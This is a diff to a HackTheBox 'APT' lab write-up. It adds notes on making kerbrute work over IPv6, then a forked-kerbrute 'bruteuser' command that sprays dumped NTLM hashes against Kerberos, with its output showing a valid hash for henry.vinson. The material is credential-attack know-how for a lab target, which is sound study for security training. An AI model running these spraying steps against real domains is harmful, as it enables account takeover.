@@ -137,7 +137,9 @@ Offical writeup from HTB is also good this time.
 
 With 2000 users, I need a way to check how much of this is valid. Because Kerberos is available on IPv6 (TCP 88), I can use Kerbrute to check the users. I’ll get a list of just the users. 
 
-Also, Getting kerbrute to connect to an IPv6 was a bit tricky. Just putting the address in as the DC didn’t work. Eventually I got it working using the hosts file to define the IPv6 as apt.htb. My hosts file will show both apt.htb and htb.local as this IPv6
+Also, Getting `kerbrute` to connect to an IPv6 was a bit tricky. Just putting the address in as the DC didn’t work. Eventually I got it working using the hosts file to define the IPv6 as apt.htb. My hosts file will show both apt.htb and htb.local as this IPv6.
+
+A domain (-d) or a domain controller (--dc) must be specified. If a Domain Controller is not given the KDC will be looked up via DNS. But for IPV6, it needs both
 
 ```bash
 grep ':::' backup_ad_secretdump | awk -F: '{print $1}' > users
@@ -153,3 +155,23 @@ grep ':::' backup_ad_secretdump | awk -F: '{print $1}' > users
 ```
 
 Only find one non-default username i.e. henry.vinson
+
+##### Bruteuser by using a forked kerbrute
+* https://github.com/ropnop/kerbrute/pull/67
+```bash
+~/kerbrute/kerbrute-arm64 bruteuser -d htb.local --dc apt.htb hash.list henry.vinson --etype rc4-hmac
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 10/31/23 - Ronnie Flathers @ropnop
+
+2023/10/31 17:01:27 >  Using KDC(s):
+2023/10/31 17:01:27 >   apt.htb:88
+
+2023/10/31 17:01:33 >  [+] VALID LOGIN:  henry.vinson@htb.local:e53d87d42adaa3ca32bdb34a876cbffb
+2023/10/31 17:01:38 >  Done! Tested 2 logins (1 successes) in 10.929 seconds
+```
